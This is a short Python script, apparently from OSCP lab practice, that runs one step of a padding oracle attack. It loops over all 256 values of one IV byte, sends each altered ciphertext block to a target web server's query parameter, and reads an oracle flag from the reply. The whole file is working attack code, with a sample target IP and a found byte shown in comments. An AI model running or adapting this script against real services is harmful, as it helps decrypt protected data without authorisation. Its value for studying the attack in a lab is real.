#!/usr/bin/python3
# usage E:\OSCP>python padding-oracle-findbyte1st.py 192.168.226.119 2290
# Found byte: 0x34

import sys, urllib.parse, requests

def send_request(ip, port, param):
    r = requests.get(url = 'http://' + ip + ':' + port + '/?c=' + param)
    resp = str(r.content)
    idx = resp.index('MyLabel') + 9
    resp = resp[idx : idx + 1]
    return int(resp)

if __name__ == '__main__':
    if len(sys.argv) < 3:
        print('[-] Usage: python3 ' + sys.argv[0] + ' <IP> <Port>')
        sys.exit(1)
    target_ip = sys.argv[1]
    target_port = sys.argv[2]
    cipherblock = '2312420765204ce350b1fbb826c59488'
    iv_prefix = '4358b2f77165b5130e323f'
    iv_suffix = '7bb7c9a8'
    for i in range(0, 256, 1):
        str_byte = str(hex(i)).replace('0x', '')
        if send_request(target_ip, target_port, iv_prefix + str_byte + iv_suffix + cipherblock) == 1:
            print('Found byte: 0x' + str_byte)
            sys.exit(0)